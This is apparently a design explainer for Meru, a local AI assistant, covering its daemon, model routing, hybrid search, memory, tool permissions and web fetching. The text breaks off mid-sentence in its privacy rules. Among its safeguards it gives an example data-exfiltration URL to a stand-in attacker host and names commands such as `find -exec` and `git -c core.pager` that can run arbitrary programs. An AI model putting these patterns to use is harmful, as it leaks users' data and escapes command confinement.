# Meru architecture, level 200: how it works

*Meru* (मेरु) is a personal AI assistant that runs on a machine you control. This page
explains each part in plain words, for readers who want to understand the system
without building it. [Level 100](100.md) gives the big picture.
[Level 300](../../ARCHITECTURE.md) is the full design; where the two disagree, level
300 wins.

## What Meru is

Meru answers questions, searches your notes and calls tools you already use, such as
your calendar or email. Every model it runs sits on the same machine as your files: a
Mac first, a Linux box or a cloud server you rent. Windows 10 and later should work
but is untested at first.

An assistant that reads your notes, mail and calendar could leak all three.
A *cloud model*, one that runs on another company's servers, would see every prompt.
Meru has no code that talks to one. It runs open-weight models through Ollama, a free
program that serves models on your own computer, and reaches Ollama over *loopback*,
the 127.0.0.1 address that never leaves the machine. Tools you add run as separate
programs, and one such as Gmail can reach the network on its own (see
[Tools over MCP](#tools-over-mcp-other-agents-over-a2a)). So can SearXNG, the
search engine you run for web search (see [Web search](#web-search)).

## Two programs: merud and meru

A tool that loaded a model for each question would make you wait every time: the
larger main model weighs about 18 GB and takes many seconds to read from disk. So Meru
runs as two programs.

- **`merud`** is a *daemon*, a program that runs in the background all the time. It
  keeps the models loaded, owns your stored data, holds the connections to tools, runs
  scheduled jobs and runs the *agent loop*, the code that turns a question into an
  answer.
- **`meru`** is the client you type into. It reaches `merud` through a *Unix socket*,
  a file (`~/.meru/merud.sock`) that two local programs talk through. It starts in
  about 50 ms, prints the answer as the model writes it, and exits.

**Why Go.** Both programs are written in Go rather than Python, the usual language
for AI tools. Each builds into one file of tens of megabytes that runs on macOS, Linux
or Windows with nothing else installed; a Python app would also need an interpreter
and its packages. `merud` runs all day, so its small memory use matters, and it
matters more when one server runs a Meru for each of many people, sharing one Ollama.
Go also runs streaming, parallel tool calls and background jobs side by side without
extra machinery, and its standard library covers most of what Meru needs, so Meru
depends on fewer outside packages. [Level 300](../../ARCHITECTURE.md#why-go) lists
all the reasons and the trade-off.

`meru "..."` asks one question and prints plain text, so it works in scripts.
`meru chat` keeps a conversation open in the terminal until you quit. On a cloud
server you run `meru` over SSH. The desktop app, `meru-desktop`, is a third client
in a window of its own (see [The desktop app](#the-desktop-app)). After a reboot the operating system restarts `merud`:
`launchd` on macOS, `systemd` on Linux, a Windows service on Windows.

### The desktop app

`meru-desktop` shows the same conversation in a native window. [Wails
v3](https://wails.io) pairs its Go code with the system's own WebView, the browser
engine the operating system already ships, so the app is one binary and the page is
plain HTML, CSS and JavaScript. Like `meru chat`, it holds no model or tool logic:
questions go to `merud` over the socket, and events come back.

The window has three columns. On the left, past chats grouped by day, a search box,
a status block that says whether `merud` runs, which model answers and how many
files it can search, and two buttons, Library and Setup. In the middle, the
conversation: each answer opens with one line of what Meru did ("Searched mail ·
Read lisbon.md"), streams as it is written, and ends with source chips that open
the files and three actions: Copy, Save to a note and Try again. Share as file, in
the header, saves the whole chat. On the right, "What this answer used" lists the
sources, the tool calls and the memories Meru remembered, each with a Forget
button, and says who the tools contacted: "The model ran on this Mac. Only google
was contacted."

Under the text box, a switch sets where Meru looks: Auto, My files, Mail and
calendar, Web or Just talk. Auto lets the router pick; the others set the route
and the tools themselves, so Just talk reaches no tool at all. A paperclip attaches
a file from a folder Meru may read, and typing "/" opens the same slash commands
`meru chat` has.

An approval shows as an amber card inside the answer, with a mail's To, Subject and
Body laid out to read, and three buttons: Send, Edit first and Don't send. Edit
first says no and puts the mail in the text box as a draft to change and send
again; Meru asks again before it sends. While the card is open, the right panel
says why Meru asks and what else that server may do.

The Library holds the settings: each connection with an Off, Ask or Allow switch
per tool, the folders Meru indexes, what Meru knows about you, the skills, the
models, the tool log and the usage numbers. Setup walks a new user through four
steps: the models, the folders, the connections and a few facts about you. The app
changes no file itself. It asks `merud`, which writes `config.toml` with the same
code `meru mcp add` uses, keeps every comment, and applies the change without a
restart.

Model output could hold HTML meant to run in the window, so the app sanitizes each
answer before it shows it, sets a Content-Security-Policy that blocks inline scripts
and anything from the network, and opens links only through Go, which allows `http`,
`https` and `file`. Wails needs a C compiler and the WebView's headers, so the app
builds on its own with `make desktop`, and the usual builds skip it. For now it
builds on macOS; Linux and Windows come later.

## A question, end to end

A *turn* runs from your question to the finished answer. A *session* is one
conversation, a run of turns that share one transcript file. Four parts do the work:

- The **fast model** acts as the *router*. It picks a *route*: answer directly,
  search your files, call tools, or search and call tools. It picks nothing else;
  from v0.4 a second short call will pick which *skills*, files of instructions for
  one kind of task, to load.
  The router doesn't write its choice out as text, which a small model can garble.
  It labels the four routes A to D, asks for a single letter, and reads how likely
  the model thought each letter was. The most likely letter wins, and its likelihood
  is the router's confidence. When the router isn't confident enough, Meru searches
  your files and allows tools, which costs a little more but never leaves a question
  without the context it needs. The router's prompt names the folders you index,
  so it can tell that "what database does meru use" asks about your own project.
  It also names what you connected, such as your Google and Obsidian servers and
  your local commands, so "what was the last email I sent?" goes to tools.
  On a labelled set of questions it held back from tuning, the router picks the
  right route for 34 of 46, in about 30 ms. When it still picks "answer directly"
  for a question that names one of your folders, Meru searches anyway. When a
  question names a tool server you connected, such as "search my Obsidian vault",
  Meru offers the tools even if the router left them out.
  ([Level 300](../../ARCHITECTURE.md#routing) and the
  [router design note](../fast-router.md) have the details.)
- The **main model** chooses tools and writes the answer.
- **`dispatch`** is the one function every tool call passes through. It checks the
  call against your config, asks you when config says to, runs it and logs it.
- An **MCP server** is a separate program that offers tools, such as the Google
  server's `search_gmail_messages`.

**Turn 1.** You ask what you agreed on the launch date in email this week. `merud`
writes the question to the transcript, and the router picks "search and call tools".
`merud` searches your files, your memories and the summaries of past sessions for
your question, and sends the client the numbered list of what it found. It asks each
connected MCP server for its tools again and gives each server that isn't connected
one more try, then hands the main model the best
matches, your question and a description of each tool you allowed. The model asks
for `search_gmail_messages`, which is allowed and needs no yes from you, so
`dispatch` calls it and logs the call. The model reads the matching messages and
writes an answer that cites the files it used by number, and `meru` lists those
files under the answer.

**Turn 2.** You type "reply to that thread and confirm I can make it". `merud` loads this
session's earlier questions and answers, newest first, until their share of the
prompt fills. The router reads them too, and picks "call tools". It doesn't rewrite
your words. The main model reads turn 1's answer, which named the thread and the
date, and works out which thread "that thread" means. On a turn that searches, `merud` adds an earlier question to the search, so
a follow-up such as "and the one after that?" still finds the right files. It skips
questions such as "try that again" that name no subject. The model asks for
`send_gmail_message`, which sits on the
server's *confirm list*, the tools that need your yes on every call. So `dispatch`
stops and asks.

Within a turn the main model either asks for tools or answers. Each time it asks,
`merud` runs the calls at the same time and hands back the results, and the client
shows a line for each call as it starts and ends. The turn ends when the model
answers, or after 8 rounds (a config setting); the last round offers no tools, so
the model has to answer. When the model asks for the same call twice, with the
same arguments, `merud` doesn't run it again: it hands back the first result
with a note, and after the second repeat it stops offering tools. A small model
once called the clock tool eight times in a row. Each model call may write at
most 8,192 tokens, its hidden thinking included, and a whole turn gets 5
minutes; both are config settings. A turn that hits a limit before it has an
answer tells you so: "Sorry, I couldn't answer that. Try asking again, or
rephrase the question." Text that already reached you stays, with a note that
it was cut off. A thinking model sometimes spends a round on hidden reasoning
and writes nothing; when the turn has a round left, `merud` asks it once more,
with no tools, to answer from what it has, and says sorry only if that reply
is empty too. The two routes with tools send every allowed tool's
description. The search route sends the four read-only file tools, so the
model can open a whole file when ten excerpts fall short, and the local commands
that don't ask first, so "what changed in the meru repo this week?" can run a
`git log` you declared. The web tools wait for a tools route. A model can't call a tool it hasn't seen. The model reads up to 16,000 characters
of each result; the log keeps the first 4,000. Before that, `dispatch` swaps
any run of 2,000 or more base64 characters in a server's or agent's result for
a short note: a model can't read a file sent as base64, and one PDF came back
as 109,068 characters of it. Shorter IDs that look like base64 stay, since the
model passes them back.

### Approving a tool call

| Choice | What happens |
| --- | --- |
| Approve once | This call runs. The next call to the same tool asks again. |
| Approve for this session | This call runs, and Meru stops asking about that tool, whatever its arguments, until the session ends. |
| Deny | The call doesn't run. The model hears that you said no, so it can answer without the tool or ask you what to do. |

The question and your answer travel over the same socket as the answer text.
`meru chat` shows the call in a box that opens with deny selected, so a stray Enter
runs nothing. One-shot `meru` asks on the terminal, `[o]nce [s]ession [d]eny`.
`merud` writes your choice to the transcript. A session approval never reaches the
config file; to stop Meru asking about a tool for good, you take it off the confirm
list yourself. When nobody can answer, as in a script, a pipe or a scheduled job,
the call doesn't run, and the log records it as declined.

## Models: three jobs, two profiles

Meru gives models three jobs, called *tiers*. The code asks for a tier, and the config
file names the model that fills it.

| Tier | Job |
| --- | --- |
| `fast` | routing, trivial answers |
| `main` | reasoning, choosing tools, writing the answer |
| `embed` | turning text into embeddings for search |

An *embedding* is a list of numbers that stands for a text's meaning. Two passages
that say the same thing in different words get lists that sit close together.

Two *profiles*, sets of models for the tiers, ship with Meru:

| | `lite` (the default) | `full` |
| --- | --- | --- |
| Chat models | MiniCPM5-2B (1.6 GB) fills both `fast` and `main` | MiniCPM5-2B for `fast`, Qwen 3.8 27B (about 18 GB) for `main` |
| Embedding model | `nomic-embed-text` (about 260 MB) | `qwen3-embedding:0.6b` |
| Needs | 16 GB of RAM; runs on a CPU, faster with a GPU or Apple silicon | Apple silicon with 32 GB (64 GB is comfortable), or a GPU with about 24 GB |

`merud` loads every tier at startup and asks Ollama to keep them loaded, so no
question waits for a model. Switching embedding models makes every stored embedding
useless, since each model makes lists of a different length. The index records which
model made its embeddings. When config names a different one, `merud` drops the old
embeddings, keeps keyword search working, and embeds your files again.

## Where data lives

**Files hold the truth, and the database is an index built from them.** Delete the
database and `merud` rebuilds it. The files are:

- the folders you ask Meru to index: notes, documents, PDFs, code;
- session transcripts in `~/.meru/sessions/`, one file per session;
- memories in `~/.meru/memory/`, one Markdown file per fact;
- `config.toml` and the `skills/` folder.

A transcript is a *JSON Lines* file: one small JSON record per line, one line per
event. `merud` adds lines and never rewrites old ones, so a crash loses at most the
line it was writing, and `grep` or `tail -f` can read it. Two lines from turn 1:

```json
{"ts":"2026-09-23T10:15:03Z","type":"tool_call","call_id":"call-1","kind":"mcp","server":"google","tool":"search_gmail_messages","args":{"query":"launch date"},"trace_id":"4bf9…"}
{"ts":"2026-09-23T10:15:09Z","type":"assistant","text":"Sam and Priya agreed on 14 October…","tokens_in":2310,"tokens_out":188,"trace_id":"4bf9…"}
```

The index is one SQLite file, `~/.meru/meru.db`, readable only by you. It holds your
files cut into pieces, with a keyword index and an embedding for each piece, and
since v0.3 a row for every tool call. Later milestones add the rest: every message
and your memories (v0.4), and your scheduled jobs with the outcome of each run
(v0.5). If you delete `meru.db`, `merud` rebuilds the tool calls from the
transcripts when it next starts. Each message and tool call keeps its turn's
*trace ID*, a label that links it to the timing data in
[What you can see](#what-you-can-see).

## Getting your content in

Meru reads only the folders you list under `[index] folders` in `config.toml`, and
none until you list one. Inside them the *indexer* skips, in order: symbolic links,
which it never follows; secret files such as `.env` or `id_rsa`, which no ignore
file can bring back; hidden files; build folders such as `node_modules`; anything a
`.gitignore` or `.meruignore` names; media, archives and programs; files over 5 MB;
and anything else that isn't text. A `.meruignore` uses `.gitignore` syntax, so you
can skip more, or bring back with `!name` a file git ignores. The file tools
`read_file`, `list_folder`, `grep` and `search_files` follow the same rules,
through the indexer's own code.

The indexer cuts each file into *chunks* of about 500 tokens along its own
structure: Markdown by heading, Go code by function or type, other code and text by
blank lines, HTML by heading, and PDFs by page, as plain text without layout. Each
chunk repeats the last 50 tokens of the one before, so a sentence cut at a boundary
still appears whole somewhere.

`merud` reads the folder list when it starts, so a change takes a restart. It scans
the folders at startup and re-reads a file only when its timestamp or contents
change. The same scan drops the files of any folder you took off the list. While it runs it watches the folders, and re-indexes a file half a second
after you save it. `meru index` rescans on demand, and `meru index -status` shows
what the index holds. Email, calendar and Drive stay out of the index: Meru asks
their tools at question time, so your mail never lands in `meru.db`.

## Finding things: hybrid search

Each common way to search misses one kind of question:

- **Search by meaning** compares embeddings. It finds a note about "the new app's
  release date" when you ask about the launch, but can miss an exact string such as
  a project code name.
- **Keyword search** ranks chunks with *BM25*, the standard formula for how well a
  passage's words match the query's. It finds "Kestrel" every time, and misses a note
  that uses other words.

Meru runs both, takes the top 50 from each, and merges the two lists. Their scores
use different scales, so adding them would let one list drown the other.
*Reciprocal-rank fusion* (RRF) ignores the scores and uses only each chunk's place: a
chunk earns 1 ÷ (60 + its place) from every list it appears in, and the amounts add
up.

Take the query "Kestrel launch". Suppose keyword search returns `standup.md`,
`launch-plan.md`, `todo.md`, and meaning search returns `launch-plan.md`,
`release-checklist.md`, `standup.md`:

| Chunk | Keyword place | Meaning place | Sum | Score |
| --- | --- | --- | --- | --- |
| `launch-plan.md` | 2 | 1 | 1/62 + 1/61 | 0.0325 |
| `standup.md` | 1 | 3 | 1/61 + 1/63 | 0.0323 |
| `release-checklist.md` | — | 2 | 1/62 | 0.0161 |
| `todo.md` | 3 | — | 1/63 | 0.0159 |

`launch-plan.md` wins because both searches rank it high. `release-checklist.md`
never names the code name but still makes the list through meaning. The 60 keeps first and second
place within about 1.6% of each other, so a chunk both lists agree on beats one that
only a single list ranks first. Meru keeps the top 10, loads their text and file
paths, and numbers them in the prompt. The main model cites them as `[1]`, `[2]`, and
`meru` prints the cited files under the answer. An answer that cites nothing gets
no list: the model decides when a source matters. The prompt also names the folders
Meru indexes, so the model doesn't claim it can't see your files while it reads
them. The sizes 50 and 10 are constants in
the code, not settings; we'll tune them once we have measurements.

Meru stores each embedding as a plain row in `meru.db` and compares the question
with every one. On the development machine that takes 13 ms over 10,000 chunks and
about 150 ms over 100,000, fast enough for a personal index.

The search runs on the two routes that search, and looks for your question, plus an
earlier question on a short follow-up; a question that names its own subject is searched alone. The tools route searches too, because the router
sends some questions about your files there, unless the question points at a
connected tool: it names a server, says "remember", names the web, or names what
a server's tools handle, such as "my calendar". Such a turn needs no excerpts,
still offers the file tools, and gets a shorter prompt without the note on using
them. So far it searches file chunks; from
v0.4 it also searches memories and the summaries of past sessions. RRF merges the
two lists within each source, and each source gets its own share of the prompt, so
one busy source can't crowd out the others.

    Q["query"] --> E["embed model"]
    E --> V["meaning search<br/>top 50"]
    Q --> K["keyword search (BM25)<br/>top 50"]
    V --> R["merge by rank (RRF)"]

### Search first, or let the model look

The model can also run this search itself. The `search_files` tool takes a query
the model writes and returns numbered excerpts, which join the answer's sources
like the prompt's. `[index] retrieval` decides who searches first. With `auto`,
the default, `merud` searches before the answer, as above, and the model may
search again with other words. With `agentic`, `merud` searches nothing first
and adds no earlier conversations; the model looks with `search_files`, `grep`,
`list_folder` and `read_file`, the way a coding agent explores a repository.

On the owner's 19 check questions with the `lite` model, three runs each, `auto`
passed 54 of 57 and `agentic` 47 of 57. Questions answered by one search tied.
`agentic` failed "when did I visit Lisbon?" every time: the answer sits in
travel PDFs, and the 2B model kept searching and reading instead of answering.
It was faster on questions that need no files, such as "which Obsidian vaults do
I have?" (1.2 s against 14 s), because a prompt with no excerpts stays the same
from turn to turn and Ollama reuses its work on it. So `auto` stays the default.
ARCHITECTURE.md, "Retrieval", has the full table.

`auto` then borrowed that speed for questions that don't need your files. A
`tools` turn whose question points at a connected tool skips the search, and
only turns about your files get the note on the file tools. On a made-up set of
18 questions, three runs before and after, the passes went from 49 to 50 of 54.
The two questions for a test MCP server fell from 4.5 s to 1.5 s, web answers
stopped listing file sources, and file questions passed as before.

## Memory

Meru remembers facts about you between sessions. Each memory is a small Markdown file,
one fact per file, in a folder named for its kind:

```text
~/.meru/memory/
  me/            who you are: role, family, where you live
  preferences/   how you like things done
  projects/      ongoing work, goals, deadlines
  people/        people you mention and how they relate to you
  reference/     where things live: accounts, URLs, tools
  other/         anything worth keeping that fits no folder above
```

```markdown
---
created: 2026-09-23
source: session 2026-09-23T101502-7f3a
---
Prefers short replies, with the answer in the first sentence.
```

The header names the session the fact came from, so you can read the exchange that
produced it. To make Meru forget, delete the file or run `meru memory forget`. A new
folder becomes a new kind with no code change.

- **Saving.** The model calls `remember`, a *built-in tool* that `merud` provides
  itself. The call goes through `dispatch`, so it lands in the log. Memories save
  without asking unless you add `remember` to the built-in confirm list, which ships
  empty. `remember` arrives in v0.4.
- **Recall.** Every turn searches memories by meaning and by keyword, adds a third
  list ranked by recency, and merges the three with RRF. Recall runs on every route,
  so a preference such as "always ask before sending mail" reaches the model on the
  turn that sends mail.
- **Episodes.** When a session ends, the fast model writes a one- or two-sentence
  summary into the transcript, and Meru embeds it. "What did we decide about the
  garden beds last week?" then finds the right session.

If Meru believes something wrong about you, you find the file and fix it. You could
not check or correct a memory stored only as numbers.

## Skills

A skill is a Markdown file of instructions at `~/.meru/skills/<name>/SKILL.md`, with a
name and a short description of when to use it. The prompt carries only names and
descriptions. `merud` loads a skill's full text when a short model call picks it, so
adding skills barely grows the prompt.

Four skills ship inside the program:

| Skill | What it does |
| --- | --- |
| `writing` | plain-English rules for any prose Meru writes: emails, summaries, reports |
| `explainer` | builds a self-contained web page that teaches a topic, with diagrams |
| `web-research` | for how to use a program or command, and for questions about current facts: search, read the best one or two pages, prefer the project's own site, check dates, cite each URL |
| `file-research` | for questions about your own files, not how to use a program: `search_files` for a topic, `grep` for an exact name, `list_folder` to look around, `read_file` for the whole text; stop after two or three rounds and cite |

A skill can name the tools its steps use, in an `allowed-tools` line, as Claude's
skills do. `web-research` names `web_search` and `web_fetch`. When the pick
chooses it for a question the router sent straight to the model, the turn gains
those tools, so the model can do what the skill says. The router alone missed
one such question: "help me understand btop with some simple commands" got 0.76
for "answer directly" and 0.02 for "call tools". A skill only brings tools your
config allows. When it allows none of them, say `web_search` with no SearXNG,
the turn leaves that skill's text out rather than tell the model to use a tool
it doesn't have.

The fast model picks from the descriptions alone. With the first wording it chose
`file-research` for the btop question, and the model grepped your folders instead of
searching the web. `web-research` now names programs and commands, and
`file-research` rules them out; on 21 labelled questions asked three times each
(`make pick-eval`), right picks went from 50 of 63 to 52, with no stray
`file-research`. A turn that offers `web_search` and the file tools also tells the
model to search the web when your files don't answer, and never to make up a
command's flags or a version number.

On first run `merud` copies them to `~/.meru/skills/`. It never overwrites a skill
you've edited, and `meru skills reset <name>` restores the shipped one. You add a
skill by dropping in a folder. To turn a skill off, name it in `[skills] disabled`
in `config.toml`; `merud` then neither loads it nor, for a built-in, installs it
again. Skills that make files use the built-in
`write_file` tool, which writes only inside `~/meru-output/` unless you change
it, and asks you before each file. These skills
work best on the `full` profile; the 2B model writes weaker pages.

## Tools over MCP, other agents over A2A

*MCP* (Model Context Protocol) is an open standard for programs that offer tools to an
assistant. Meru is an MCP client. It either starts a local server and talks over its
input and output (*stdio*), or connects to a server already running at a URL
(*Streamable HTTP*). The model sees each allowed tool as `<server>.<tool>`, such
as `google.search_gmail_messages`. *A2A* (Agent2Agent) is an open standard for handing a
task to another agent. The model sees each allowed agent skill as one more tool,
named `a2a.<agent>.<skill>`, that takes a message and returns the agent's answer.
Meru reads an agent's *card*, the file where it lists its skills, the first time a
turn needs it, so an agent that starts after `merud` still shows up.

Both follow the same rules, set per server or agent in `config.toml`:

- **Deny by default.** A server that offers 40 tools gives the model none until you
  name specific ones in its `allow` list. Wildcards aren't allowed: a `*` would let
  in tools a server adds in a later release, which nobody has read.
- **Confirm.** Tools on the `confirm` list ask you on every call.
- **Loopback unless you say otherwise.** `merud` refuses a server or agent URL off
  this machine unless its entry says `remote = true`. An agent elsewhere may pass
  your message to a cloud model, so that setting means consent for your data to
  leave. `remote` covers only where `merud` may connect. The `google` server sits
  on loopback with `remote = false` and still talks to Google. Before a rename it
  was `network`, and `merud` refuses to load a config that still says `network`. The
  A2A client checks each address again as it connects, and follows no redirects,
  so an agent's card can't point the calls somewhere else.
- **One door.** MCP tools, A2A agents, local commands and the built-in tools all
  go through `dispatch`. No other code reaches them. The built-in tools are `configure`,
  `datetime`, `remember`, `write_file`, the web tools `web_search` and
  `web_fetch`, and four that only read your files: `read_file` returns a
  whole file, 12,000 characters at a time; `list_folder` shows what a folder
  holds; `grep` finds every line that matches; `search_files` runs the hybrid
  search below for the words the model picks. The built-in tools need no allow
  entry. `[builtin] tools` in `config.toml` lists the ones the model sees, all
  ten by default; take a name out to turn that tool off. `search_files` searches
  only the index. The other three file tools reach your `[index] folders` and
  `~/meru-output`, which holds what `write_file` wrote, what `web_fetch`
  downloaded and the mail attachments the `google` server saved, and skip what
  the indexer skips.

```mermaid
flowchart LR
    CALL["model asks for a tool"] --> A{"in the allow list?"}
    A -- no --> X["denied; model told"]
    A -- yes --> B{"in the confirm list?"}
    B -- no --> RUN["run it"]
    B -- yes --> ASK{"you: once · session · deny"}
    ASK -- approve --> RUN
    ASK -- deny --> NO["declined; model told"]
    RUN --> LOG["log: tool, arguments, result,<br/>time taken, approval, trace ID"]
    NO --> LOG
    X --> LOG
```

`dispatch` logs every call to the transcript and the `tool_calls` table, and
`meru log` shows the newest ones (`-n` for how many, `-v` for each result).
`meru tools` shows each server, whether `merud` reached it, and the tools the model
may use. A call to a tool you didn't allow doesn't run, but it still
gets a row, so a model that keeps reaching for forbidden tools shows up in the log.
An assistant that can send email or change your calendar needs a record you can read
afterwards.

Each call has a time limit, 60 seconds unless the server's entry sets another. A
server Meru starts gets only a short list of environment variables plus its own, so
it can't read another tool's API key from `merud`'s environment.

`merud` doesn't supervise MCP servers. For a stdio server it starts the program as a
child, because the child's input and output are the connection. For an HTTP server
it connects to the URL, and you start the server yourself, with `launchd`, `systemd`
or by hand, as you start Ollama. `merud` never restarts a server, checks its health
or waits for it.

`merud` tries to connect to each server once when it starts. At the start of each
turn on a tools route, it asks each connected server for its tools again, gives each
server that isn't connected one more try, then lists the tools. When the try fails,
the turn goes on without that server. A server that crashed counts as not connected
and gets the same one try, and so does one whose listing fails because it restarted
and forgot `merud`'s session. The extra listing costs about 0.3 ms on loopback.
Nothing runs in the background between turns, so a server that fails on start
doesn't spin. You can start the Google server after `merud`, or restart it with more
tools, and your next question sees it. A call that fails because the session is
gone isn't sent again, since the tool may already have run.

`meru mcp`, or `/mcp` in `meru chat`, shows one row per server: its transport,
whether it's connected, how many tools it offers (`—` when not connected), how many
config allows and how many ask first, and its URL or why it isn't connected.
`merud` builds the rows from config and what it already holds, and calls no server,
so the view appears at once and works while a server is down.

Meru doesn't confine MCP servers. Each runs as an ordinary program with your
permissions and can read files or reach the network on its own. The allowlist decides
which tools the model may call; the server decides what each call does. Adding a
server means trusting it, as with any program you install.

### Web search

Meru searches the web through *SearXNG*, a search engine you run on your own
machine in Docker. SearXNG keeps no index: it passes the search words to engines
such as Google, Bing and DuckDuckGo, drops the cookies that identify you, and
merges the results. It needs no account and no API key. `merud` reaches it on
loopback at `[web] searxng_url`, `http://127.0.0.1:8888` by default, and refuses a
URL off this machine.

The built-in `web_search` tool sends one search and gives the model numbered
results: title, URL, a short snippet and the date when known. The model cites the
URLs it uses. A second tool, `web_fetch`, fetches one public page (HTML, PDF or
plain text). Without a prompt it returns the page's text in 12,000-character
pages. With a prompt, such as "what is the latest release?", the fast model reads
up to 48,000 characters of the page and answers from the page alone, quoting its
versions and dates. With `save`, it downloads the file to
`~/meru-output/downloads/` instead.

`web_fetch` is on by default, because a small model that trusts old snippets gets
"what's the latest release?" wrong. Taking it out of `[builtin] tools` turns it
off. It makes
`merud` itself connect to sites off this machine, and those sites see your IP
address. It refuses any address on this machine or your local network, checked
as it connects, so neither a page nor a redirect can point it at your router or
another local service.

A URL can also carry data out: `https://attacker.example/?notes=...`. So
`web_fetch` runs without asking only for a URL that a search result or your own
question showed earlier in the same session. Any other URL asks you first, and so
does every download. A scheduled job has nobody to ask, so it skips them.

Your search words leave the machine, through SearXNG to the engines it asks. Your
question, your files and the answer don't. When SearXNG isn't running, `merud`
still starts, and a search fails with a message that points at the setup steps in
[docs/running.md](../running.md).

### Local commands

To let the model run a program on your machine, you declare the whole command in
`config.toml`, and the model fills in its blanks:

```toml
[[commands]]
name        = "git-log"
description = "Commits from the past week in one of the user's repositories"
argv        = ["git", "-C", "{repo}", "log", "--since=1.week", "--oneline"]

  [commands.params.repo]
  type  = "path"
  under = "~/repos"
```

The model sees the tool `cmd.git-log` and passes `{"repo": "meru"}`. `merud` checks
the value against its type: a `path` must exist and, with every link followed, lie
inside `under`; a `string`, `int` or `enum` has limits of its own. Each value fills
one argument, whatever spaces, quotes or semicolons it holds, and `merud` starts
`git` directly, with no shell. So the model can't add a flag, chain a second program
or reach a shell. `merud` refuses at startup a command whose program is a shell or a
script interpreter, such as `bash` or `python`.

A program you declare gets `PATH`, `HOME` and `LANG` and nothing else from `merud`'s
environment, unless the entry names more. It runs for at most 30 seconds unless the
entry sets a timeout, and the timeout kills every process it started. The model
reads the exit code and what it printed; a failed exit is a result it can react to.
`confirm = true` makes a command ask first. `meru tools` shows what each command
runs, and `meru log` shows the exact arguments of every run.

Meru uses no MCP shell server. A shell server confines nothing Meru doesn't, adds a
runtime to install, and keeps the real rules, which program with which arguments,
where `dispatch` can't log them. A plain list of allowed programs isn't safe either:
`find -exec`, `git -c core.pager=…` and `ssh host …` each run anything.

## Scheduled jobs

A job is a prompt plus a *cron expression*, the standard format for "run at these
times", such as every weekday at 7:00. You list jobs in `config.toml`. `merud` runs the prompt through the same agent
loop as a typed question and sends the output to a digest, a file or a notification;
`meru brief` shows the day's digest. Nobody watches a job, so no tool on a confirm
list runs, and no local command with `confirm = true`; the output names the calls
it skipped. Each run is a
session with its own transcript, so a job's work shows up in the same log and traces
as your questions, and it uses the same loaded models.

## First run and setup

`meru setup` walks you through seven steps in the terminal. You can run it again at
any time; v0.3 doesn't start it for you the first time you run `meru`.

1. **Ollama.** Meru checks that Ollama runs, and if not, prints the install step
   and waits.
2. **Models.** You pick `lite` or `full`, and Meru downloads the models with
   `ollama pull`.
3. **Your files.** Meru asks which folders to index and writes `config.toml`
   from the config template, which holds every setting: what is on by default
   stays uncommented with its default value, and what is off sits there
   commented, ready to uncomment. It never rewrites a config file you already
   have, because that would drop your comments; it tells you what to edit
   instead. `meru config template` prints the template.
4. **Web search.** Meru checks that SearXNG answers. If not, it prints the Docker
   commands that start it, or the setting that turns on JSON, and waits. You can
   skip it.
5. **Tools.** Meru offers its starter MCP servers one at a time. You can skip any.
6. **About you**, when `merud` runs: your name, your email, your work, where you live and how
   you like answers, each saved as a memory. `meru setup user` asks the same.
7. **A test question**, when `merud` runs, so you see it work.

The starter catalog holds two servers. `google` covers Gmail, Calendar, Drive
and Docs. It runs over Streamable HTTP on `127.0.0.1:8000`, and you start it
yourself: Meru prints the command, with your Google OAuth client ID and secret, and
never runs it. `obsidian` reads
and appends to your Obsidian notes through the Local REST API plugin. Each entry
knows how to start or reach its server, what it needs, and safe starting lists:
reading allowed, anything that sends, writes, runs or changes something on the
confirm list. For `google`, sending mail and changing an event ask first. Its
start command tells the server to save the mail attachments the model asks for
in `~/meru-output/attachments`. When a tool result names a file it just saved
there, `dispatch` reads the file and adds its path and text to the same result,
so the model needn't open it; `read_file` reads the rest of a long one. The
server deletes each file after an hour. The
catalog has no shell server; declare the programs you want in `[[commands]]`
instead. For each server you pick **"Do it for me"**, where Meru asks for what the
server needs and writes the config block after you approve it, or **"Show me
how"**, where Meru prints the block and you paste it in. Later, `meru mcp add
google` offers the same choice. `meru mcp list` shows the catalog and your servers;
`meru mcp remove <name>` takes one out of config.

For a server outside the catalog, run `meru mcp add stdio <name> -- <command>`, or
`meru mcp add http <name> <url>` for one you run yourself; a URL on another
machine needs `--remote`. Meru can't know a server's tool names before it
connects, so `merud` *probes* the server first: it starts it for a moment, lists every tool it offers,
and stops it, calling none of them. Many servers mark each tool with two hints:
*read-only* (it changes nothing) or *destructive* (it may delete or overwrite).
From those, Meru proposes a split: read-only tools allowed, tools that change
something allowed but asking first. You edit the split before Meru writes the
entry, since a server can mislabel a tool. A catalog entry is probed too, but its
own lists win over the hints. For a server you run, such as `google`, Meru probes
only when something answers at the URL; otherwise it writes the catalog's lists,
and `merud` connects on your first question after you start the server. Then `merud` reloads its servers, so
the new one works without a restart. A reload also drops a server you removed
from config and stops its program.

In chat, "connect my Gmail" makes the model call the built-in `configure` tool,
which adds the entry and reloads the servers the same way. `configure` asks
every time and offers only "approve once" or "deny". No setting turns that prompt
off, so the model can't grant itself lasting trust. It never takes an API key:
when a server needs one that isn't saved yet, it sends you to `meru mcp add` in a
terminal, so the key never passes through the model.

API keys go in `~/.meru/secrets.toml`, and config names them as `secret:<name>`.
`merud` refuses to start if other users can read that file, and strips the keys
from transcripts, the tool log, logs and traces.

## What you can see

Meru times every stage of a turn with *OpenTelemetry*, the open standard for timing
and counting what software does. A *trace* follows one turn and splits it into timed
steps: routing, search, each model call, each tool call. A slow answer then shows
which step took the time. A *metric* adds numbers up across turns, such as tokens per
model or how often a tool fails.

- Export stays off until you set an address in config, and `merud` refuses to start
  if that address isn't on loopback.
- Traces carry token counts, times, model names and tool names, and no prompt or
  answer text unless you switch it on. Each tool call gets a span of its own, with
  its outcome and your approval.
- The repo ships one container, `grafana/otel-lgtm`, that stores the data and shows a
  ready-made Meru dashboard in Grafana, listening on 127.0.0.1 only.

The trace ID ties the two views together: a slow step in Grafana leads to the exact
messages and tool calls in the log, and back.

Without the dashboard, `merud`'s own log file answers the same question. By default it
writes one line per turn with its route, total time and time to first token. Started
with `merud -v`, it writes a line for each step as well, each with the turn's trace ID
and none with your text.

## The privacy rules

- The code has no path to a cloud model. The engine talks only to Ollama on loopback.
- You allow MCP tools and A2A agent skills one by one. An agent or Streamable HTTP
  server off this machine needs `remote = true` in its config entry. That setting
  covers where `merud` connects; a loopback server such as `google` still talks to
  Google.
- Web search sends your search words through SearXNG to the engines it asks.
  `web_fetch` lets `merud` fetch public pages off this machine when the model
  asks, never one on your machine or local network. It asks you first for a URL
  no search or question of yours gave, and before any download. Taking it out
  of `[builtin] tools` turns it off.
- Meru doesn't sandbox MCP servers, so choose them as you would any program.
- A local command runs as you, and reaches the network if you declare one that
